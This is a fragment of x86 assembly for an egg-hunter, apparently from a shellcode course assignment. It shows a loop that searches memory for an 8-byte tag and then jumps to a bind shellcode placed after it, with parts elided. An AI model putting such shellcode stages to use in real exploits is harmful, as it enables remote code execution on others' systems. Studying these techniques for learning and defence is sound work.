...
nxtaddress:			;next address
    ...
    je pgalign		;jmp to pg_align incase of invalid address
    mov eax,0x50905090	;move the Egg to eax register
    mov edi,ecx		;load pointer to edi register
    scasd			;compare eax with edi register
    jnz nxtaddress		;jmp to nx_address incase no matching of egg
    scasd 			;comparing second word of egg
    jnz nxtaddress		;jmp to nxt_address incase second word doesnt match
    jmp edi			;if egg matches jmp to edi where the shellcode begins


	; 8 byte egg tag to search
	    nop                   
    	push eax                 
    	nop			
    	push eax		
	...
	;bind shellcode from assigment 1
